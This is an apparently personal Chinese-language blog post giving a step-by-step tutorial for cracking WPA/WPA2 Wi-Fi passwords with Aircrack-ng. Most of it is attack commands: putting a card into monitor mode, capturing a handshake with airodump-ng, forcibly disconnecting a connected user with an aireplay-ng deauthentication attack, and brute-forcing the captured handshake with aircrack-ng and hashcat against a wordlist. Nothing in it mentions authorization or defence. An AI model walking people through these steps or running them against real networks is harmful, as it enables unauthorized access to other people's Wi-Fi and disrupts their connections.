title: Aircrack-ng 爆破 wifi 密码
author: l1n6yun
tags: []
categories: []
date: 2020-06-04 00:00:00
---
Aircrack-ng是一个基于WiFi无线网络分析有关的安全软件，主要功能有网络侦测、数据包嗅探、WEP和WPA/WPA2-PSK破解等。
因为安全性的原因。现在，周围很少有用WEP算法来加密的WiFi密码，不过基本命令都很相似。

WiFi网络构成

1. WiFi是一个建立于IEEE 802.11标准的无线局域网络（WLAN）设备。
2. WiFi工作原理AP(Access Point 例如：无线路由器)每100ms将SSID（Service Set Identifier）经由beacons（信号台）封包广播一次。

#### 查看网卡信息
```shell
iwconfig
```

![upload successful](/images/pasted-57.png)

#### 启动监听模式

```shell
airmon-ng start wlan0
```

![upload successful](/images/pasted-58.png)

#### 准备抓取握手包

```shell
airodump-ng -c 6 -bssid 64:6E:97:DA:39:5C -w thomas wlan0
```

- -c：信道号
- --bssid：apMAC
- -w：保存的文件名

![upload successful](/images/pasted-59.png)

扫描到的WiFi热点信息

- BSSID：WiFi路由器的MAC地址
- PWR：网卡报告信号水平，信号值越高说明离AP越近。（PWR=-1，网卡驱动不支持报告此项信息）
- Beacons：无线AP发出的通告编号
- #Data：被捕获到的数据分组的数量（一般数据量越大，抓取握手包更容易）
- #/s：过去10秒钟内每秒捕获数据分组的数量
- CH：信道号（从Beacon中获取）
- MB：无线AP所支持的最大速率
- ENC：加密算法体系
- CIPHER：加密算法
- AUTH：使用的认证协议
- ESSID：wifi名称

使已连接WiFi的用户A强制下线，之后A会向WiFi路由重新发送一个带密码的请求握手包

```shell
aireplay-ng -0 2 -a 64:6E:97:DA:39:5C -c C2:46:34:ED:48:4C wlan0
```

- -0：攻击数据包数量
- -a：WiFi MAC 地址
- -c：用户 MAC 地址

![upload successful](/images/pasted-60.png)

出现 `WAP handshake` 表示已经获取到了握手包，下面就可以实现破解了

![upload successful](/images/pasted-61.png)

#### 开始爆破

```shell
aircrack-ng -w pass.txt thomas-01.cap
```

- -w：字典文件路径

![upload successful](/images/pasted-62.png)

#### hashcat

关于密码破解，可以使用kali自带的hashcat使效率大大增加

```
aircrack-ng [抓取到的握手包文件名] -J [转换后的文件名]
hashcat -m 2500 .hccap password.txt
```
参数： -m 2500为破解的模式为WPA/PSK方式  hccap格式的文件是刚刚转化好的文件  字典文件 
 
注：最新版hashcat一般情况下不支持hccap格式，第一步需将握手包cap格式转换为hccapx